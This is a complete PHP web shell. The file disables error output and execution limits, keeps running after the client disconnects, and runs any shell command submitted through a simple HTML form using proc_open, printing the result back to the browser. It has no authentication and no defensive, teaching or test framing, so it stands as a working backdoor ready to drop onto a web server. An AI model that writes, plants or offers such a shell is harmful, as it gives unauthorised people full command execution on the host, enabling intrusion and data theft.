<?php
ignore_user_abort(true);
ini_set('memory_limit', '-1');
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', 0);
ini_set('max_execution_time', 5000);

class CommandExecutor {
    private $workingDirectory;

    public function __construct($workingDirectory = __DIR__) {
        $this->workingDirectory = $workingDirectory;
    }

    public function executeCommand($command) {
        $descriptors = [
            0 => ['pipe', 'r'], 
            1 => ['pipe', 'w'], 
            2 => ['pipe', 'w'], 
        ];

        $process = proc_open($command, $descriptors, $pipes, $this->workingDirectory);

        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);

            $error = stream_get_contents($pipes[2]);
            fclose($pipes[2]);

            proc_close($process);

            return "<pre>$output</pre>";
        }
        return "<pre>Failed to execute command</pre>";
    }
}


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
    $executor = new CommandExecutor();
    echo $executor->executeCommand($_POST['command']);
} else {
    
    echo '<form method="post">
            <input type="text" name="command" size="30" placeholder="Enter command">
            <input type="submit" value="Execute">
          </form>';
}
?>
